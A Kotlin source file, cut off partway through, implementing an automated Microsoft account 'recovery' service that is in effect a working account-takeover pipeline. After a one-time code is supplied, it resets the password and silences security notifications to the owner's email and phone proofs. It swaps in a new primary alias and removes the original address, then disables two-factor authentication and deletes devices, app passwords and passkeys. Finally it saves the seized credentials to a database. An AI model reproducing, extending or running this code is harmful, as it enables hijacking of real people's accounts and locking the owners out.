package microsoft.recovery

import database.model.RecoveredAccount
import database.repository.AccountRepository
import io.ktor.client.HttpClient
import io.ktor.client.call.body
import io.ktor.client.engine.HttpClientEngine
import io.ktor.client.engine.okhttp.OkHttp
import io.ktor.client.plugins.HttpRedirect
import io.ktor.client.plugins.cookies.AcceptAllCookiesStorage
import io.ktor.client.plugins.cookies.CookiesStorage
import io.ktor.client.request.forms.submitForm
import io.ktor.client.request.get
import io.ktor.client.request.header
import io.ktor.client.request.post
import io.ktor.client.request.setBody
import io.ktor.client.statement.bodyAsText
import io.ktor.http.ContentType
import io.ktor.http.Cookie
import io.ktor.http.HttpHeaders
import io.ktor.http.URLBuilder
import io.ktor.http.Url
import io.ktor.http.contentType
import io.ktor.http.isSuccess
import io.ktor.http.parameters
import io.ktor.http.takeFrom
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.delay
import kotlinx.serialization.json.contentOrNull
import kotlinx.serialization.json.intOrNull
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import microsoft.recovery.alias.AliasClient
import microsoft.recovery.model.GenerateRecoveryCodeRequest
import microsoft.recovery.model.GenerateRecoveryCodeResponse
import microsoft.recovery.model.GenericCanaryResponse
import microsoft.recovery.model.GetCredentialTypeRequest
import microsoft.recovery.model.GetCredentialTypeResponse
import microsoft.recovery.model.GetOneTimeCodeResponse
import microsoft.recovery.model.MakePrimaryRequest
import microsoft.recovery.model.ManageProofsData
import microsoft.recovery.model.NotificationProofDetail
import microsoft.recovery.model.ProofItem
import microsoft.recovery.model.RecoverUserRequest
import microsoft.recovery.model.RecoverUserResponse
import microsoft.recovery.model.RecoveryResult
import microsoft.recovery.model.RecoveryStage
import microsoft.recovery.model.SecurityCleanupRequest
import microsoft.recovery.model.SetUserNotificationStateRequest
import microsoft.recovery.model.VerifyRecoveryCodeRequest
import microsoft.recovery.model.VerifyRecoveryCodeResponse
import microsoft.recovery.util.MicrosoftHttpClientFactory
import microsoft.recovery.util.RecoveryParsers
import org.jsoup.Jsoup
import org.slf4j.LoggerFactory
import java.security.SecureRandom

typealias StageListener = suspend (stageKey: String, stageName: String, isSuccess: Boolean, detail: String) -> Unit

class RecoveryService(
    private val clientEngine: HttpClientEngine? = null,
    private val stageDelayMs: Long = 1000L,
    private val accountRepository: AccountRepository? = null,
    private val aliasClient: AliasClient? = null,
) : AutoCloseable {

    private val logger = LoggerFactory.getLogger(RecoveryService::class.java)
    private val secureRandom = SecureRandom()

    override fun close() {
    }

    suspend fun runLifecycle(
        email: String,
        otpProvider: suspend () -> String,
        newPassword: String? = null,
        newEmail: String? = null,
        stageListener: StageListener? = null,
    ): RecoveryResult {
        if (email.isBlank()) {
            return RecoveryResult.Failure(RecoveryStage.CREDENTIAL_DISCOVERY, "Email cannot be blank")
        }

        val targetPassword = if (!newPassword.isNullOrBlank()) {
            newPassword
        } else {
            val length = secureRandom.nextInt(5) + 12
            RecoveryParsers.generateRandomPassword(length)
        }

        val effectiveNewEmail = newEmail?.trim()
            ?: aliasClient?.generateRandomAlias()
            ?: "recov_${RecoveryParsers.generateUaid().take(8)}@outlook.com"

        val cookieStorage = AcceptAllCookiesStorage()
        val client = if (clientEngine != null) {
            MicrosoftHttpClientFactory.create(storage = cookieStorage, engine = clientEngine)
        } else {
            MicrosoftHttpClientFactory.create(storage = cookieStorage)
        }

        return try {
            executeLifecycle(
                client = client,
                cookieStorage = cookieStorage,
                email = email.trim(),
                otpProvider = otpProvider,
                newPassword = targetPassword,
                newEmail = effectiveNewEmail,
                stageListener = stageListener,
            )
        } catch (e: CancellationException) {
            throw e
        } catch (e: Exception) {
            logger.error("Unhandled exception during lifecycle automation: {}", e.message, e)
            RecoveryResult.Failure(
                stage = RecoveryStage.CREDENTIAL_DISCOVERY,
                message = "Lifecycle failed with unexpected exception: ${e.message}",
                cause = e,
            )
        } finally {
            client.close()
        }
    }

    private suspend fun executeLifecycle(
        client: HttpClient,
        cookieStorage: CookiesStorage,
        email: String,
        otpProvider: suspend () -> String,
        newPassword: String,
        newEmail: String,
        stageListener: StageListener? = null,
    ): RecoveryResult {
        var uaid = RecoveryParsers.generateUaid()

        val stage1Result = executeStage1(client, email, stageListener)
        if (stage1Result is StageExecution.Failure) return stage1Result.result
        val (initialPpft, proofId, proofChannel) = (stage1Result as StageExecution.Success).value

        val stage2Result = executeStage2(client, email, initialPpft, proofId, proofChannel, stageListener)
        if (stage2Result is StageExecution.Failure) return stage2Result.result
        val postPpft = (stage2Result as StageExecution.Success).value

        val otp = otpProvider().trim()
        val stage2bResult = executeStage2b(client, cookieStorage, email, proofId, postPpft, otp, stageListener)
        if (stage2bResult is StageExecution.Failure) return stage2bResult.result

        val storedUaid = cookieStorage.get(Url("https://login.live.com")).firstOrNull { it.name == "uaid" }?.value
        if (!storedUaid.isNullOrBlank()) {
            uaid = storedUaid
        }

        val stage3Result = executeStage3(client, cookieStorage, uaid, stageListener)
        if (stage3Result is StageExecution.Failure) return stage3Result.result

        val postStage3Uaid = cookieStorage.get(Url("https://account.live.com")).firstOrNull { it.name == "uaid" }?.value
            ?: cookieStorage.get(Url("https://login.live.com")).firstOrNull { it.name == "uaid" }?.value
        if (!postStage3Uaid.isNullOrBlank()) {
            uaid = postStage3Uaid
        }

        val stage4Result = executeStage4(client, stageListener)
        if (stage4Result is StageExecution.Failure) return stage4Result.result
        val proofsData = (stage4Result as StageExecution.Success).value
        var activeCanary = proofsData.apiCanary
        val encryptedNetId = proofsData.encryptedNetId

        val stage5Result = executeStage5(client, encryptedNetId, activeCanary, stageListener)
        if (stage5Result is StageExecution.Failure) return stage5Result.result
        val (initialRecoveryCode, canaryAfter5) = (stage5Result as StageExecution.Success).value
        activeCanary = canaryAfter5

        val stage6Result = executeStage6(
            client = client,
            email = email,
            newPassword = newPassword,
            newEmail = newEmail,
            initialRecoveryCode = initialRecoveryCode,
            canary = activeCanary,
            stageListener = stageListener,
        )
        if (stage6Result is StageExecution.Failure) return stage6Result.result
        val (finalRecoveryCode, canaryAfter6) = (stage6Result as StageExecution.Success).value
        activeCanary = canaryAfter6

        if (stageDelayMs > 0) delay(stageDelayMs)

        val freshProofsResponse = client.get("https://account.live.com/proofs/manage/additional") {
            header("X-Requested-With", "XMLHttpRequest")
        }
        val freshProofsData = RecoveryParsers.extractManageProofsData(freshProofsResponse.bodyAsText(), MicrosoftHttpClientFactory.json)
        val emailProofs = freshProofsData?.emailProofs ?: proofsData.emailProofs
        val smsProofs = freshProofsData?.smsProofs ?: proofsData.smsProofs
        val passKeyIds = freshProofsData?.passKeyIds ?: proofsData.passKeyIds
        if (!freshProofsData?.apiCanary.isNullOrBlank()) {
            activeCanary = freshProofsData.apiCanary
        }

        val stage7Result = executeStage7(client, uaid, emailProofs, smsProofs, activeCanary, stageListener)
        if (stage7Result is StageExecution.Failure) return stage7Result.result
        val (suppressedCount, canaryAfter7) = (stage7Result as StageExecution.Success).value
        activeCanary = canaryAfter7

        if (stageDelayMs > 0) delay(stageDelayMs)

        val stage8Result = executeStage8(client, email, newEmail, uaid, activeCanary, stageListener)
        if (stage8Result is StageExecution.Failure) return stage8Result.result
        val (targetAliasEmail, canaryAfter8) = (stage8Result as StageExecution.Success).value
        activeCanary = canaryAfter8

        if (stageDelayMs > 0) delay(stageDelayMs)

        executeStage9(client, uaid, passKeyIds, activeCanary, stageListener)

        if (accountRepository != null) {
            accountRepository.saveAccount(
                RecoveredAccount(
                    originalEmail = email,
                    currentPrimaryEmail = targetAliasEmail,
                    password = newPassword,
                    recoveryCode = finalRecoveryCode,
                    ownsMinecraft = false,
                ),
            )
        }

        return RecoveryResult.Success(
            originalEmail = email,
            newPrimaryEmail = targetAliasEmail,
            password = newPassword,
            initialRecoveryCode = initialRecoveryCode,
            finalRecoveryCode = finalRecoveryCode,
            suppressedProofsCount = suppressedCount,
        )
    }

    private suspend fun executeStage1(
        client: HttpClient,
        email: String,
        stageListener: StageListener?,
    ): StageExecution<Triple<String, String, String>> {
        val loginResponse = client.get("https://login.live.com/login.srf")
        if (!loginResponse.status.isSuccess()) {
            val msg = "Failed to fetch login page: HTTP ${loginResponse.status.value}"
            stageListener?.invoke("1", "Credential Discovery", false, msg)
            return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.CREDENTIAL_DISCOVERY, msg))
        }

        val loginHtml = loginResponse.bodyAsText()
        val initialPpft = RecoveryParsers.extractPpft(loginHtml, MicrosoftHttpClientFactory.json)
            ?: run {
                val msg = "Failed to extract initial PPFT from login page"
                stageListener?.invoke("1", "Credential Discovery", false, msg)
                return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.CREDENTIAL_DISCOVERY, msg))
            }

        val credResponse = client.post("https://login.live.com/GetCredentialType.srf") {
            contentType(ContentType.Application.Json)
            header("Referer", "https://login.live.com/login.srf")
            setBody(
                GetCredentialTypeRequest(
                    username = email,
                    flowToken = initialPpft,
                    isUcuxLoginForm = true,
                    isCookieBannerShown = false,
                    checkPhones = true,
                )
            )
        }

        if (!credResponse.status.isSuccess()) {
            val msg = "Credential check failed: HTTP ${credResponse.status.value}"
            stageListener?.invoke("1", "Credential Discovery", false, msg)
            return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.CREDENTIAL_DISCOVERY, msg))
        }

        val credData = credResponse.body<GetCredentialTypeResponse>()
        when (credData.ifExistsResult) {
            0 -> {}
            1 -> {
                val msg = "Account does not exist (IfExistsResult=1)"
                stageListener?.invoke("1", "Credential Discovery", false, msg)
                return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.CREDENTIAL_DISCOVERY, msg, "1"))
            }
            5 -> {
                val msg = "Account is throttled or captcha blocked (IfExistsResult=5)"
                stageListener?.invoke("1", "Credential Discovery", false, msg)
                return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.CREDENTIAL_DISCOVERY, msg, "5"))
            }
            else -> {
                val msg = "Unexpected IfExistsResult=${credData.ifExistsResult}"
                stageListener?.invoke("1", "Credential Discovery", false, msg)
                return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.CREDENTIAL_DISCOVERY, msg, credData.ifExistsResult?.toString()))
            }
        }

        val proofs = credData.credentials?.otcLoginEligibleProofs.orEmpty()
        val primaryProof = proofs.firstOrNull()
            ?: run {
                val msg = "No OTC eligible proofs available for this account"
                stageListener?.invoke("1", "Credential Discovery", false, msg)
                return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.CREDENTIAL_DISCOVERY, msg))
            }

        val proofId = primaryProof.data
            ?: run {
                val msg = "Primary proof identifier is missing"
                stageListener?.invoke("1", "Credential Discovery", false, msg)
                return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.CREDENTIAL_DISCOVERY, msg))
            }

        stageListener?.invoke("1", "Credential Discovery", true, "IfExistsResult = 0")
        val proofChannel = if (primaryProof.type == 2) "SMS" else "Email"
        return StageExecution.Success(Triple(initialPpft, proofId, proofChannel))
    }

    private suspend fun executeStage2(
        client: HttpClient,
        email: String,
        initialPpft: String,
        proofId: String,
        proofChannel: String,
        stageListener: StageListener?,
    ): StageExecution<String> {
        val otcResponse = client.submitForm(
            url = "https://login.live.com/GetOneTimeCode.srf",
            formParameters = parameters {
                append("login", email)
                append("flowtoken", initialPpft)
                append("purpose", "eOTT_OtcLogin")
                append("channel", proofChannel)
                append("AltEmailE", proofId)
            },
        )

        val rawBody = otcResponse.bodyAsText()
        val jsonResponse = runCatching {
            MicrosoftHttpClientFactory.json.parseToJsonElement(rawBody).jsonObject
        }.getOrNull()

        val state = jsonResponse?.get("State")?.jsonPrimitive?.intOrNull
            ?: jsonResponse?.get("state")?.jsonPrimitive?.intOrNull
        val flowToken = jsonResponse?.get("FlowToken")?.jsonPrimitive?.contentOrNull
            ?: jsonResponse?.get("flowToken")?.jsonPrimitive?.contentOrNull

        if (flowToken.isNullOrEmpty()) {
            val msg = "Fatal: Missing FlowToken in response"
            stageListener?.invoke("2", "OTP Dispatch", false, msg)
            return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.OTP_DISPATCH, msg, state?.toString()))
        }

        if (state != 204 && state != null) {
            logger.warn("Microsoft returned State $state (Rate Limited). Proceeding with FlowToken.")
        }

        stageListener?.invoke("2", "OTP Dispatch", true, "FlowToken received")
        return StageExecution.Success(flowToken)
    }

    private suspend fun executeStage2b(
        client: HttpClient,
        cookieStorage: CookiesStorage,
        email: String,
        proofId: String,
        postPpft: String,
        otp: String,
        stageListener: StageListener?,
    ): StageExecution<Unit> {
        if (otp.isBlank()) {
            val msg = "Provided OTP code is blank"
            stageListener?.invoke("2b", "OTP Submit", false, msg)
            return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.SESSION_ESTABLISHMENT, msg))
        }

        val postResponse = client.submitForm(
            url = "https://login.live.com/ppsecure/post.srf",
            formParameters = parameters {
                append("login", email)
                append("loginfmt", email)
                append("type", "27")
                append("SentProofIDE", proofId)
                append("otc", otp)
                append("PPFT", postPpft)
                append("LoginOptions", "3")
            },
        )

        val loginCookies = cookieStorage.get(Url("https://login.live.com"))
        val msaAuthCookie = loginCookies.firstOrNull { it.name == "__Host-MSAAUTH" }
            ?: postResponse.headers.getAll(HttpHeaders.SetCookie)?.firstOrNull { it.contains("__Host-MSAAUTH") }?.let {
                val value = it.substringAfter("__Host-MSAAUTH=").substringBefore(";")
                Cookie(name = "__Host-MSAAUTH", value = value, domain = "login.live.com", path = "/", secure = true)
            }

        if (msaAuthCookie == null) {
            val msg = "Failed to establish authenticated session: __Host-MSAAUTH cookie not found"
            stageListener?.invoke("2b", "OTP Submit", false, msg)
            return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.SESSION_ESTABLISHMENT, msg))
        }

        cookieStorage.addCookie(
            Url("https://login.live.com"),
            Cookie(name = "__Host-MSAAUTH", value = msaAuthCookie.value, domain = "login.live.com", path = "/", secure = true),
        )
        cookieStorage.addCookie(
            Url("https://account.live.com"),
            Cookie(name = "__Host-MSAAUTH", value = msaAuthCookie.value, domain = "account.live.com", path = "/", secure = true),
        )

        stageListener?.invoke("2b", "OTP Submit", true, "__Host-MSAAUTH received")
        return StageExecution.Success(Unit)
    }

    private suspend fun executeStage3(
        client: HttpClient,
        cookieStorage: CookiesStorage,
        uaid: String,
        stageListener: StageListener?,
    ): StageExecution<Unit> {
        val loginCookies = cookieStorage.get(Url("https://login.live.com"))
        val currentUaid = loginCookies.firstOrNull { it.name == "uaid" }?.value ?: uaid
        val msaAuthValue = loginCookies.firstOrNull { it.name == "__Host-MSAAUTH" }?.value
        val amscValue = loginCookies.firstOrNull { it.name == "amsc" }?.value

        if (msaAuthValue.isNullOrBlank()) {
            val msg = "Missing __Host-MSAAUTH cookie for session stabilization"
            stageListener?.invoke("3", "Session Polish", false, msg)
            return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.SESSION_POLISH, msg))
        }

        val cookieParts = mutableListOf("__Host-MSAAUTH=$msaAuthValue", "uaid=$currentUaid")
        if (!amscValue.isNullOrBlank()) {
            cookieParts.add("amsc=$amscValue")
        }
        val cleanCookieHeader = cookieParts.joinToString("; ")

        val stabilizationUrl = "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=21&rver=7.5.2156.0&wp=SA_20MIN&wreply=https://account.live.com/proofs/Add?apt=2&uaid=$currentUaid&lc=1033&id=38936&mkt=en-US"

        val isolatedClient = if (clientEngine != null) {
            HttpClient(clientEngine) {
                followRedirects = true
                install(HttpRedirect) { checkHttpMethod = false }
            }
        } else {
            HttpClient(OkHttp.create()) {
                followRedirects = true
                install(HttpRedirect) { checkHttpMethod = false }
            }
        }

        val polishResponse = isolatedClient.use {
            it.get(stabilizationUrl) {
                header(HttpHeaders.Cookie, cleanCookieHeader)
                header(
                    HttpHeaders.UserAgent,
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                )
                header(
                    HttpHeaders.Accept,
                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                )
            }
        }

        val responseBodyString = polishResponse.bodyAsText()
        val hasPpft = responseBodyString.contains("name=\"PPFT\"")
        val document = Jsoup.parse(responseBodyString)
        val tokenT = document.selectFirst("input[name=t]")?.attr("value")

        if (tokenT.isNullOrBlank()) {
            if (hasPpft) {
                val msg = "Session expired or invalid, asked to login again."
                stageListener?.invoke("3", "Session Polish", false, msg)
                return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.SESSION_POLISH, msg))
            }
            val msg = "Token t not found in HTML."
            stageListener?.invoke("3", "Session Polish", false, msg)
            return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.SESSION_POLISH, msg))
        }

        val addProofResponse = client.submitForm(
            url = "https://account.live.com/proofs/Add?apt=2&wa=wsignin1.0",
            formParameters = parameters { append("t", tokenT) },
        )

        val setCookieHeaders = addProofResponse.headers.getAll(HttpHeaders.SetCookie).orEmpty()
        for (rawCookie in setCookieHeaders) {
            if (rawCookie.contains("AMRPSSecAuth=")) {
                val value = rawCookie.substringAfter("AMRPSSecAuth=").substringBefore(";")
                cookieStorage.addCookie(
                    Url("https://account.live.com"),
                    Cookie(name = "AMRPSSecAuth", value = value, domain = "account.live.com", path = "/", secure = true),
                )
            }
            if (rawCookie.contains("amsc=")) {
                val value = rawCookie.substringAfter("amsc=").substringBefore(";")
                cookieStorage.addCookie(
                    Url("https://account.live.com"),
                    Cookie(name = "amsc", value = value, domain = "account.live.com", path = "/", secure = true),
                )
            }
        }

        val accountCookies = cookieStorage.get(Url("https://account.live.com"))
        val hasAmrp = accountCookies.any { it.name == "AMRPSSecAuth" }
            || setCookieHeaders.any { it.contains("AMRPSSecAuth") }
        val hasAmsc = accountCookies.any { it.name == "amsc" }
            || setCookieHeaders.any { it.contains("amsc") }

        if (!hasAmrp || !hasAmsc) {
            val msg = "Missing AMRPSSecAuth or amsc cookies after session stabilization"
            stageListener?.invoke("3", "Session Polish", false, msg)
            return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.SESSION_POLISH, msg))
        }

        stageListener?.invoke("3", "Session Polish", true, "AMRPSSecAuth received")
        return StageExecution.Success(Unit)
    }

    private suspend fun executeStage4(
        client: HttpClient,
        stageListener: StageListener?,
    ): StageExecution<ManageProofsData> {
        val manageProofsResponse = client.get("https://account.live.com/proofs/manage/additional") {
            header("X-Requested-With", "XMLHttpRequest")
        }
        val manageProofsHtml = manageProofsResponse.bodyAsText()
        val proofsData = RecoveryParsers.extractManageProofsData(manageProofsHtml, MicrosoftHttpClientFactory.json)
            ?: run {
                val msg = "Failed to extract encryptedNetId or apiCanary from additional proofs page"
                stageListener?.invoke("4", "Proofs Enumeration", false, msg)
                return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.PROOFS_ENUMERATION, msg))
            }

        stageListener?.invoke("4", "Proofs Enumeration", true, "encryptedNetId received")
        return StageExecution.Success(proofsData)
    }

    private suspend fun executeStage5(
        client: HttpClient,
        encryptedNetId: String,
        canary: String,
        stageListener: StageListener?,
    ): StageExecution<Pair<String, String>> {
        val generateRecoveryResponse = client.post("https://account.live.com/API/Proofs/GenerateRecoveryCode") {
            contentType(ContentType.Application.Json)
            header("canary", canary)
            header("x-ms-apiVersion", "2")
            header("x-ms-apiTransport", "xhr")
            setBody(GenerateRecoveryCodeRequest(encryptedNetId = encryptedNetId))
        }

        val genCodeData = runCatching { generateRecoveryResponse.body<GenerateRecoveryCodeResponse>() }.getOrNull()
        val initialRecoveryCode = genCodeData?.recoveryCode
        if (initialRecoveryCode.isNullOrBlank()) {
            val msg = "Failed to generate initial recovery code: ${genCodeData?.error?.message ?: generateRecoveryResponse.bodyAsText()}"
            stageListener?.invoke("5", "Recovery Code Gen", false, msg)
            return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.RECOVERY_CODE_GENERATION, msg, genCodeData?.error?.code))
        }

        stageListener?.invoke("5", "Recovery Code Gen", true, "RecoveryCode generated")
        val updatedCanary = genCodeData.apiCanary?.takeIf { it.isNotBlank() } ?: canary
        return StageExecution.Success(Pair(initialRecoveryCode, updatedCanary))
    }

    private suspend fun executeStage6(
        client: HttpClient,
        email: String,
        newPassword: String,
        newEmail: String,
        initialRecoveryCode: String,
        canary: String,
        stageListener: StageListener?,
    ): StageExecution<Pair<String, String>> {
        val resetPageResponse = client.get("https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf&mn=$email")
        val resetHtml = resetPageResponse.bodyAsText()
        val resetData = RecoveryParsers.extractResetPasswordData(resetHtml, MicrosoftHttpClientFactory.json)
            ?: run {
                val msg = "Failed to extract sRecoveryToken or reset canary from reset password page"
                stageListener?.invoke("6", "Password Reset", false, msg)
                return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.PASSWORD_ROTATION, msg))
            }

        val verifyCodeResponse = client.post("https://account.live.com/API/Recovery/VerifyRecoveryCode") {
            contentType(ContentType.Application.Json)
            header("canary", resetData.apiCanary)
            setBody(
                VerifyRecoveryCodeRequest(
                    recoveryCode = initialRecoveryCode,
                    code = initialRecoveryCode,
                    token = resetData.sRecoveryToken,
                )
            )
        }

        val verifyData = runCatching { verifyCodeResponse.body<VerifyRecoveryCodeResponse>() }.getOrNull()
        val verificationGrantToken = verifyData?.token
        if (verificationGrantToken.isNullOrBlank()) {
            val msg = "Failed to verify recovery code: ${verifyData?.error?.message ?: verifyCodeResponse.bodyAsText()}"
            stageListener?.invoke("6", "Password Reset", false, msg)
            return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.PASSWORD_ROTATION, msg, verifyData?.error?.code))
        }

        val canaryAfterVerify = verifyData.apiCanary?.takeIf { it.isNotBlank() } ?: canary

        val recoverUserResponse = client.post("https://account.live.com/API/Recovery/RecoverUser") {
            contentType(ContentType.Application.Json)
            header("canary", canaryAfterVerify)
            setBody(
                RecoverUserRequest(
                    contactEmail = newEmail,
                    password = newPassword,
                    token = verificationGrantToken,
                )
            )
        }

        val recoverUserData = runCatching { recoverUserResponse.body<RecoverUserResponse>() }.getOrNull()
        val finalRecoveryCode = recoverUserData?.recoveryCode
        if (finalRecoveryCode.isNullOrBlank()) {
            val msg = "Failed to recover user credentials: ${recoverUserData?.error?.message ?: recoverUserResponse.bodyAsText()}"
            stageListener?.invoke("6", "Password Reset", false, msg)
            return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.PASSWORD_ROTATION, msg, recoverUserData?.error?.code))
        }

        stageListener?.invoke("6", "Password Reset", true, "Password changed & new code")
        val canaryAfterRecover = recoverUserData.apiCanary?.takeIf { it.isNotBlank() } ?: canaryAfterVerify
        return StageExecution.Success(Pair(finalRecoveryCode, canaryAfterRecover))
    }

    private suspend fun executeStage7(
        client: HttpClient,
        uaid: String,
        emailProofs: List<ProofItem>,
        smsProofs: List<ProofItem>,
        canary: String,
        stageListener: StageListener?,
    ): StageExecution<Pair<Int, String>> {
        var activeCanary = canary
        var suppressedCount = 0
        val targetProofs = emailProofs + smsProofs

        for (proof in targetProofs) {
            val suppressionResponse = client.post("https://account.live.com/API/Proofs/SetUserNotificationState") {
                contentType(ContentType.Application.Json)
                header("canary", activeCanary)
                setBody(
                    SetUserNotificationStateRequest(
                        proofDetails = listOf(
                            NotificationProofDetail(
                                name = proof.name,
                                notificationEnabled = false,
                                type = proof.type,
                            )
                        ),
                        uaid = uaid,
                    )
                )
            }

            if (!suppressionResponse.status.isSuccess()) {
                val msg = "Notification suppression failed for proof ${proof.name}: HTTP ${suppressionResponse.status.value}"
                stageListener?.invoke("7", "Notification Suppression", false, msg)
                return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.NOTIFICATION_SUPPRESSION, msg))
            }

            val canaryResponse = runCatching { suppressionResponse.body<GenericCanaryResponse>() }.getOrNull()
            if (!canaryResponse?.apiCanary.isNullOrBlank()) {
                activeCanary = canaryResponse.apiCanary
            }
            suppressedCount++

            if (stageDelayMs > 0) delay(stageDelayMs)
        }

        stageListener?.invoke("7", "Notification Suppression", true, "$suppressedCount proofs disabled")
        return StageExecution.Success(Pair(suppressedCount, activeCanary))
    }

    private suspend fun executeStage8(
        client: HttpClient,
        email: String,
        newEmail: String,
        uaid: String,
        canary: String,
        stageListener: StageListener?,
    ): StageExecution<Pair<String, String>> {
        var activeCanary = canary
        val targetAliasEmail: String
        val clientAlias = aliasClient

        if (clientAlias != null) {
            val aliasResult = runCatching {
                clientAlias.rotateAlias(
                    currentCanary = activeCanary,
                    oldEmail = email,
                    httpClient = client,
                    customAlias = if (newEmail.endsWith("@qhuyy.tech")) newEmail else null,
                )
            }.getOrElse { e ->
                val msg = e.message ?: "Custom domain alias rotation failed"
                stageListener?.invoke("8", "Alias Rotation", false, msg)
                return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.ALIAS_ROTATION, msg, cause = e))
            }
            targetAliasEmail = aliasResult.newEmail
            activeCanary = aliasResult.updatedCanary
            stageListener?.invoke("8", "Alias Rotation", true, "New alias verified and set as primary")
        } else {
            val newAliasPrefix = newEmail.substringBefore("@")
            targetAliasEmail = "$newAliasPrefix@outlook.com"

            val addAliasResponse = client.submitForm(
                url = "https://account.live.com/AddAssocId",
                formParameters = parameters {
                    append("canary", activeCanary)
                    append("PostOption", "NONE")
                    append("SingleDomain", "outlook.com")
                    append("AddAssocIdOptions", "LIVE")
                    append("AssociatedIdLive", newAliasPrefix)
                },
            )
            if (!addAliasResponse.status.isSuccess()) {
                val msg = "AddAssocId failed: HTTP ${addAliasResponse.status.value}"
                stageListener?.invoke("8", "Alias Rotation", false, msg)
                return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.ALIAS_ROTATION, msg))
            }

            if (stageDelayMs > 0) delay(stageDelayMs)

            val makePrimaryResponse = client.post("https://account.live.com/API/MakePrimary") {
                contentType(ContentType.Application.Json)
                header("canary", activeCanary)
                setBody(
                    MakePrimaryRequest(
                        aliasName = targetAliasEmail,
                        emailChecked = true,
                        removeOldPrimary = false,
                        uaid = uaid,
                    )
                )
            }

            if (!makePrimaryResponse.status.isSuccess()) {
                val msg = "MakePrimary request failed: HTTP ${makePrimaryResponse.status.value}"
                stageListener?.invoke("8", "Alias Rotation", false, msg)
                return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.ALIAS_ROTATION, msg))
            }

            val makePrimaryData = runCatching { makePrimaryResponse.body<GenericCanaryResponse>() }.getOrNull()
            if (makePrimaryData?.error?.code != null) {
                val msg = "MakePrimary rejected: ${makePrimaryData.error.message ?: makePrimaryData.error.code}"
                stageListener?.invoke("8", "Alias Rotation", false, msg)
                return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.ALIAS_ROTATION, msg, makePrimaryData.error.code))
            }
            if (!makePrimaryData?.apiCanary.isNullOrBlank()) {
                activeCanary = makePrimaryData.apiCanary
            }

            if (stageDelayMs > 0) delay(stageDelayMs)

            val removeAliasResponse = client.submitForm(
                url = "https://account.live.com/names/manage",
                formParameters = parameters {
                    append("canary", activeCanary)
                    append("action", "RemoveAlias")
                    append("aliasName", email)
                    append("displayName", email)
                },
            )
            if (!removeAliasResponse.status.isSuccess()) {
                val msg = "RemoveAlias failed: HTTP ${removeAliasResponse.status.value}"
                stageListener?.invoke("8", "Alias Rotation", false, msg)
                return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.ALIAS_ROTATION, msg))
            }
            stageListener?.invoke("8", "Alias Rotation", true, "New alias verified and set as primary")
        }

        return StageExecution.Success(Pair(targetAliasEmail, activeCanary))
    }

    private suspend fun executeStage9(
        client: HttpClient,
        uaid: String,
        passKeyIds: List<String>,
        canary: String,
        stageListener: StageListener?,
    ) {
        var activeCanary = canary

        val disableTfaResponse = client.post("https://account.live.com/API/Proofs/DisableTfa") {
            contentType(ContentType.Application.Json)
            header("canary", activeCanary)
            header("X-Requested-With", "XMLHttpRequest")
            setBody(SecurityCleanupRequest(uaid = uaid))
        }
        val disableTfaData = runCatching { disableTfaResponse.body<GenericCanaryResponse>() }.getOrNull()
        if (!disableTfaData?.apiCanary.isNullOrBlank()) {
            activeCanary = disableTfaData.apiCanary
        }

        if (stageDelayMs > 0) delay(stageDelayMs)

        val deleteDevicesResponse = client.post("https://account.live.com/API/Proofs/DeleteDevices") {
            contentType(ContentType.Application.Json)
            header("canary", activeCanary)
            header("X-Requested-With", "XMLHttpRequest")
            setBody(SecurityCleanupRequest(uaid = uaid))
        }
        val deleteDevicesData = runCatching { deleteDevicesResponse.body<GenericCanaryResponse>() }.getOrNull()
        if (!deleteDevicesData?.apiCanary.isNullOrBlank()) {
            activeCanary = deleteDevicesData.apiCanary
        }

        if (stageDelayMs > 0) delay(stageDelayMs)

        val deleteAppPasswordResponse = client.post("https://account.live.com/API/Proofs/DeleteAppPassword") {
            contentType(ContentType.Application.Json)
            header("canary", activeCanary)
            header("X-Requested-With", "XMLHttpRequest")
            setBody(SecurityCleanupRequest(uaid = uaid))
        }
        val deleteAppPasswordData = runCatching { deleteAppPasswordResponse.body<GenericCanaryResponse>() }.getOrNull()
        if (!deleteAppPasswordData?.apiCanary.isNullOrBlank()) {
            activeCanary = deleteAppPasswordData.apiCanary
        }

        if (stageDelayMs > 0) delay(stageDelayMs)

        if (passKeyIds.isNotEmpty()) {
            for (keyId in passKeyIds) {
                val removePasskeyResponse = client.post("https://account.live.com/API/Proofs/RemovePasskey") {
                    contentType(ContentType.Application.Json)
                    header("canary", activeCanary)
                    header("X-Requested-With", "XMLHttpRequest")
                    setBody(SecurityCleanupRequest(passKeyId = keyId, uaid = uaid))
                }
                val removePasskeyData = runCatching { removePasskeyResponse.body<GenericCanaryResponse>() }.getOrNull()
                if (!removePasskeyData?.apiCanary.isNullOrBlank()) {
